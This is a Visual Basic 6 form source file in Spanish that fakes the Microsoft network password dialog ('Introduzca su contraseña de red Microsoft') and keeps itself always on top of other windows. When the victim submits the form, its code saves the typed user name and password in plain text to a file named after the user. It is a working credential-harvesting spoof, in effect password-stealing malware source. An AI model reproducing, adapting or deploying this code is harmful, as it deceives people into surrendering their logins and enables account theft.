VERSION 5.00
Begin VB.Form frmUserPass 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Escribir contraseña de red"
   ClientHeight    =   2190
   ClientLeft      =   2190
   ClientTop       =   2265
   ClientWidth     =   7515
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   2190
   ScaleWidth      =   7515
   WhatsThisButton =   -1  'True
   WhatsThisHelp   =   -1  'True
   Begin VB.CommandButton cmdCancel 
      Cancel          =   -1  'True
      Caption         =   "Cancelar"
      Height          =   375
      Left            =   6120
      TabIndex        =   4
      Top             =   555
      Width           =   1215
   End
   Begin VB.TextBox Text1 
      Height          =   310
      Left            =   3000
      TabIndex        =   2
      Text            =   "aleman"
      Top             =   1680
      Width           =   2895
   End
   Begin VB.TextBox txtPass 
      Height          =   310
      IMEMode         =   3  'DISABLE
      Left            =   3000
      PasswordChar    =   "*"
      TabIndex        =   1
      Top             =   1260
      Width           =   2895
   End
   Begin VB.TextBox txtUser 
      Height          =   310
      Left            =   3000
      TabIndex        =   0
      Top             =   840
      Width           =   2895
   End
   Begin VB.CommandButton cmdEnter 
      Caption         =   "Aceptar"
      Default         =   -1  'True
      Height          =   375
      Left            =   6120
      TabIndex        =   3
      Top             =   120
      Width           =   1215
   End
   Begin VB.Label lblTitulo 
      Caption         =   "Introduzca su contraseña de red Microsoft."
      Height          =   255
      Left            =   1440
      TabIndex        =   8
      Top             =   240
      Width           =   3135
   End
   Begin VB.Image Image1 
      Height          =   705
      Left            =   360
      Picture         =   "frmUserPass.frx":0000
      Stretch         =   -1  'True
      Top             =   240
      Width           =   705
   End
   Begin VB.Label lblDominio 
      Caption         =   "&Dominio:"
      Height          =   255
      Left            =   1440
      TabIndex        =   7
      Top             =   1680
      Width           =   1455
   End
   Begin VB.Label lblClave 
      Caption         =   "&Contraseña:"
      Height          =   255
      Left            =   1440
      TabIndex        =   6
      Top             =   1260
      Width           =   1455
   End
   Begin VB.Label lblUser 
      Caption         =   "&Nombre de usuario:"
      Height          =   255
      Left            =   1440
      TabIndex        =   5
      Top             =   840
      Width           =   1455
   End
End
Attribute VB_Name = "frmUserPass"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Private Sub Archivar_Click()
 Randomize Timer
 Archivo = txtUser.Text + ".txt"
 Open Archivo For Output As #1
 Write #1, txtUser
 Write #1, txtPass
 Write #1,
 Unload Me
End Sub
Private Sub cmdCancel_Click()
Unload Me
Unload frmInicio
End Sub

Private Sub cmdEnter_Click()
Archivar_Click
Unload frmInicio
End Sub

Private Sub cmdEnter_KeyPress(KeyAscii As Integer)
m = KeyAscii
If m = 27 Then
Unload Me
End
End If
If m = 13 Then
Archivar_Click
End If
End Sub
Private Sub Form_Load()
frmInicio.Show
AlwaysOnTop Me, -1
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
m = KeyAscii
If m = 27 Then
Unload Me
End
End If
If m = 13 Then
Archivar_Click
End If
End Sub

Private Sub txtPass_KeyPress(KeyAscii As Integer)
m = KeyAscii
If m = 27 Then
Unload Me
End
End If
If m = 13 Then
Archivar_Click
End If
End Sub

Private Sub txtUser_KeyPress(KeyAscii As Integer)
m = KeyAscii
If m = 27 Then
Unload Me
End
End If
If m = 13 Then
Archivar_Click
End If
End Sub

Sub AlwaysOnTop(FrmID As Form, OnTop As Integer)
    Const SWP_NOMOVE = 2
    Const SWP_NOSIZE = 1
    Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
    Const HWND_TOPMOST = -1
    Const HWND_NOTOPMOST = -2
    If OnTop = -1 Then
        OnTop = SetWindowPos(FrmID.hwnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
    Else
        OnTop = SetWindowPos(FrmID.hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
    End If
End Sub
